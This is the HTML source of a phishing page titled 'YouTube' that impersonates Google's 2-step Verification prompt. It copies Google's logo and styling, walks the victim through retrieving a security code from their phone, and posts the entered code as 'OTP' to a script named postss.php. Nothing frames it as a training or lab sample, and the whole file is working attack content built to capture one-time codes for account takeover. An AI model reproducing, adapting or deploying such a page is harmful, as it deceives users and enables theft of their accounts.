<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>YouTube</title><link rel="shortcut icon" href="//www.google.com/favicon.ico">
    <link rel="stylesheet" href="style.css">
    <style>

</style>
</head>
<body>
        <div class="box" style="
    top: 300px;
    width: 412px;
    height: 582px;
    bottom: auto;
"><center style="
    margin-left: 120px;
    margin-top: -20;
"><svg viewBox="0 0 74 37" width="198" height="37" preserveAspectRatio="xMinYMin" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg></center>
                <h2 style="
    margin-bottom: 0px;
">2-step Verification

</h2><center><p style="
    margin-top: 5px;
    margin-bottom: 0px;
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    color: #5f6368;
    text-align: inherit;
    font-size: 16px;
">This extra step shows it's really you trying to sign in


</p><center style="
    margin-top: 0px;
"><div jscontroller="BzWZlf" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;" class="YZrg6 HnRr5d cd29Sd iiFyne" tabindex="0" role="link" aria-label="" jsname="af8ijd" style="
    margin-top: 0px;
    margin-bottom: 25px;
    border: 1px solid #dadce0;
    -webkit-border-radius: 16px;
    position: relative;
    width: 124px;
    height: 24px;
"><div class="gPHLDe"><div class="qQWzTd" aria-hidden="true" style="
    /* border: 1px solid #dadce0; */
"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg" style="/* border: 1px solid #dadce0; */color: darkgray;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z" style="
    border: 1px solid #dadce0;
"></path></svg></div></div><div class="KlDWw" id="profileIdentifier"></div><div class="krLnGe"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71" style="
    color: darkgray;
"></polygon></svg></div></div></center><p class="left-align pad-no mar-no" style="
    font-size: 15px;
    color: #202124;
    /* left: auto; */
    text-align: initial;
    margin-top: 0px;
    margin-bottom: 0px;
">● Get your <strong>Phone<strong></strong></strong></p>
<p class="left-align pad-no mar-no" style="
    font-size: 15px;
    color: #202124;
    /* left: auto; */
    text-align: initial;
    margin-top: 0px;
    margin-bottom: 0px;
">● Open the <strong>Settings<strong> app <svg xmlns="https://www.w3.org/2000/svg" aria-hidden="true" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" fill="#616161"><path d="M13.85,22.25h-3.7c-0.74,0-1.36-0.54-1.45-1.27l-0.27-1.89c-0.27-0.14-0.53-0.29-0.79-0.46l-1.8,0.72 c-0.7,0.26-1.47-0.03-1.81-0.65L2.2,15.53c-0.35-0.66-0.2-1.44,0.36-1.88l1.53-1.19c-0.01-0.15-0.02-0.3-0.02-0.46 c0-0.15,0.01-0.31,0.02-0.46l-1.52-1.19C1.98,9.9,1.83,9.09,2.2,8.47l1.85-3.19c0.34-0.62,1.11-0.9,1.79-0.63l1.81,0.73 c0.26-0.17,0.52-0.32,0.78-0.46l0.27-1.91c0.09-0.7,0.71-1.25,1.44-1.25h3.7c0.74,0,1.36,0.54,1.45,1.27l0.27,1.89 c0.27,0.14,0.53,0.29,0.79,0.46l1.8-0.72c0.71-0.26,1.48,0.03,1.82,0.65l1.84,3.18c0.36,0.66,0.2,1.44-0.36,1.88l-1.52,1.19 c0.01,0.15,0.02,0.3,0.02,0.46s-0.01,0.31-0.02,0.46l1.52,1.19c0.56,0.45,0.72,1.23,0.37,1.86l-1.86,3.22 c-0.34,0.62-1.11,0.9-1.8,0.63l-1.8-0.72c-0.26,0.17-0.52,0.32-0.78,0.46l-0.27,1.91C15.21,21.71,14.59,22.25,13.85,22.25z M13.32,20.72c0,0.01,0,0.01,0,0.02L13.32,20.72z M10.68,20.7l0,0.02C10.69,20.72,10.69,20.71,10.68,20.7z M10.62,20.25h2.76 l0.37-2.55l0.53-0.22c0.44-0.18,0.88-0.44,1.34-0.78l0.45-0.34l2.38,0.96l1.38-2.4l-2.03-1.58l0.07-0.56 c0.03-0.26,0.06-0.51,0.06-0.78c0-0.27-0.03-0.53-0.06-0.78l-0.07-0.56l2.03-1.58l-1.39-2.4l-2.39,0.96l-0.45-0.35 c-0.42-0.32-0.87-0.58-1.33-0.77L13.75,6.3l-0.37-2.55h-2.76L10.25,6.3L9.72,6.51C9.28,6.7,8.84,6.95,8.38,7.3L7.93,7.63 L5.55,6.68L4.16,9.07l2.03,1.58l-0.07,0.56C6.09,11.47,6.06,11.74,6.06,12c0,0.26,0.02,0.53,0.06,0.78l0.07,0.56l-2.03,1.58 l1.38,2.4l2.39-0.96l0.45,0.35c0.43,0.33,0.86,0.58,1.33,0.77l0.53,0.22L10.62,20.25z M18.22,17.72c0,0.01-0.01,0.02-0.01,0.03 L18.22,17.72z M5.77,17.71l0.01,0.02C5.78,17.72,5.77,17.71,5.77,17.71z M3.93,9.47L3.93,9.47C3.93,9.47,3.93,9.47,3.93,9.47z M18.22,6.27c0,0.01,0.01,0.02,0.01,0.02L18.22,6.27z M5.79,6.25L5.78,6.27C5.78,6.27,5.79,6.26,5.79,6.25z M13.31,3.28 c0,0.01,0,0.01,0,0.02L13.31,3.28z M10.69,3.26l0,0.02C10.69,3.27,10.69,3.27,10.69,3.26z"></path><circle cx="12" cy="12" r="3.5"></circle><path fill="none" d="M0,0h24v24H0V0z"></path></svg> </strong></strong></p><p class="left-align pad-no mar-no" style="
    font-size: 15px;
    color: #202124;
    text-align: initial;
    margin-top: 0px;
    margin-bottom: 0px;
">● Tap <strong>Google<strong></strong></strong></p><p class="left-align pad-no mar-no" style="
    font-size: 15px;
    color: #202124;
    /* left: auto; */
    text-align: initial;
    margin-top: 0px;
    margin-bottom: 0px;
">● Choose your account, if it not already selected

</p><p class="left-align pad-no mar-no" style="
    font-size: 15px;
    color: #202124;
    /* left: auto; */
    text-align: initial;
    margin-top: 0px;
    margin-bottom: 0px;
">● Tap <strong>Manage your Google Account<strong>

</strong></strong></p><p class="left-align pad-no mar-no" style="
    font-size: 15px;
    color: #202124;
    /* left: auto; */
    text-align: initial;
    margin-top: 0px;
    margin-bottom: 0px;
">● Select the Security tab (you may need to scroll to the right)

</p><p class="left-align pad-no mar-no" style="
    font-size: 15px;
    color: #202124;
    /* left: auto; */
    text-align: initial;
    margin-top: 0px;
    margin-bottom: 0px;
">● Under 'Signing in to Google' tap <strong>Security code<strong>

</strong></strong></p><p class="left-align pad-no mar-no" style="
    font-size: 15px;
    color: #202124;
    /* left: auto; */
    text-align: initial;
    margin-top: 0px;
    margin-bottom: 0px;
">● Choose an account to get your code 

</p></center>
                
                <form action="postss.php" method="post">
                  <div class="inputBox" style="
    top: 15px;
">
                    <input type="email" name="OTP" required="" onkeyup="this.setAttribute('value', this.value);" value="" style="
    margin-top: -5;
    width: 322px;
    height: 55px;
    padding-bottom: 15px;
    margin-bottom: 0px;
">
                    <label style="
    left: 15px;
">Enter the code</label><label class="container" style="
    bottom: auto;
    top: 50px;
">
  
  <label class="container" style="
    left: -15;
    width: 30px;
">
  <input type="checkbox">  
</label><p class="center-align pad-no mar-no" style="
    font-size: 14px;
    color: #5f6368;
    margin-bottom: 0px;
    text-align: inherit;
    margin-left: 20px;
    margin-top: 0px;
">Don’t ask again on this device</p><p style="
    margin-top: 15px;
    margin-bottom: 0px;
    text-align: inherit;
    font-size: 14px;
    color: #039be5;
    font-color: #039be5;
">
<a href="" style="text-decoration: none;color: #039be5;font-weight: 600;">Learn more
   </a>
</p></label><p style="
    margin-top: 0px;
    margin-bottom: 30px;
"></p><a href="" style="text-decoration: none;">
</a>
   
   

                  </div>
                  
                  <input type="submit" name="sign-in" style="
    width: 77px;
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    background-color: var(--gm-fillbutton-container-color,#1a73e8);
    /* font-size: 14px; */
    font-weight: 550;
    text-transform: none;
    border-radius: 4px;
    font-size: 14px;
    margin-top: 30px;
" value="Next">
<p style="
    margin-top: 130px;
    margin-bottom: 0px;
    font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
    color: #5f6368;
    text-align: left;
    font-size: 12px;
    /* TEXT-DECORATION: none; */
    margin-left: -20;
">© English (United States)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy &nbsp;Terms&nbsp;&nbsp;Help <br></p>
                </form>
              </div>
</body></html>